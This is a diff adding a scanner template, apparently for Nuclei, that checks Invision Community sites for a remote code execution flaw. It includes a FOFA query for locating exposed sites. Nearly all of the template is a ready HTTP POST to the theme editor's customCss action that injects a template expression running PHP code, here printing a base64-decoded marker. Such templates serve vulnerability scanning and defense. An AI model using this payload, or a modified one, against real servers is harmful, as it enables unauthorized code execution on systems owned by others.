@@ -1,0 +1,24 @@
+id: poc-wenloo026mnewdd5
+info:
+  name: InvisonCommunity存在远程代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wenloo026mnewdd5'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wenloo026mnewdd5
+    fofa: body="Invision" && body="ips4"
+http:
+- raw:
+  - 'POST / HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    app=core&module=system&controller=themeeditor&do=customCss&content={expression="die(''Hello''. base64_decode(''SGFja1R3bw''))"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
